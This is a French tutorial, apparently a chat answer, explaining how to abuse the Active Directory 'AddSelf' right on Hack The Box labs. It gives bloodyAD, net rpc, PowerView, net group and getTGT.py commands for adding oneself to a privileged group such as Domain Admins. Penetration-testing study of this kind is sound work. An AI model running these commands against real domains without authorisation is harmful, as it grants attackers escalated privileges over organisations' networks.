`AddSelf` (parfois appelé `Self-Membership` ou `WriteProperty` sur l'attribut `member` avec droit "Self") est un droit qu'on trouve presque toujours sur des **objets groupe**. Il te permet de **t'ajouter toi-même** en tant que membre de ce groupe, sans avoir besoin d'un droit `GenericWrite`/`WriteProperty` classique sur l'objet.

## Le concept

Concrètement, dans l'ACL du groupe, il y a une ACE spéciale avec le droit étendu "Self-Membership" accordée à ton compte (ou à un groupe dont tu es membre). Ça te permet uniquement d'ajouter/retirer **toi-même** du groupe — pas d'autres utilisateurs, pas d'autres attributs.

## Pourquoi c'est intéressant en attaque

Le vrai intérêt dépend du **groupe cible** :
- Si c'est un groupe avec des privilèges élevés (Domain Admins, un groupe local admin sur une machine, un groupe avec des ACL intéressantes ailleurs), t'y ajouter = escalade directe.
- Sur HTB c'est souvent une étape intermédiaire dans une chaîne d'attaque BloodHound (AddSelf → membership → nouveau droit détenu → prochaine étape).

## Commandes Linux

**Avec `bloodyAD`** (le plus simple et fiable pour ça) :
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' add groupMember <target_group> <user>
```

**Avec `net rpc`** (samba-tools) :
```bash
net rpc group addmem "<target_group>" "<user>" -U "<domain>/<user>%<password>" -S <dc_ip>
```

**Avec `impacket` (via LDAP directement)** — il n'y a pas de script dédié standard, mais tu peux utiliser `ldap3` en Python ou passer par `bloodyAD` qui reste la référence pour ce genre d'opérations LDAP ciblées.

## Commandes Windows

**Avec PowerView** :
```powershell
Add-DomainGroupMember -Identity '<target_group>' -Members '<user>' -Credential $cred
```

**Avec les cmdlets AD natives** (si tu es déjà authentifié dans une session avec les droits) :
```powershell
Add-ADGroupMember -Identity "<target_group>" -Members "<user>"
```

**Avec `net.exe`** (le plus basique, fonctionne presque toujours si tu es sur une session authentifiée) :
```cmd
net group "<target_group>" <user> /add /domain
```

## Vérification après coup

Confirme que l'ajout a fonctionné :
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' get object "<target_group>" --attr member
```

## Et après ?

Une fois membre du groupe, il faut **régénérer ton ticket Kerberos** (ou te reconnecter) pour que les nouveaux privilèges soient pris en compte — sinon ton token/TGT en cache ne reflète pas encore ta nouvelle appartenance :

```bash
# avec un nouveau TGT via impacket
getTGT.py <domain>/<user>:'<password>'
```
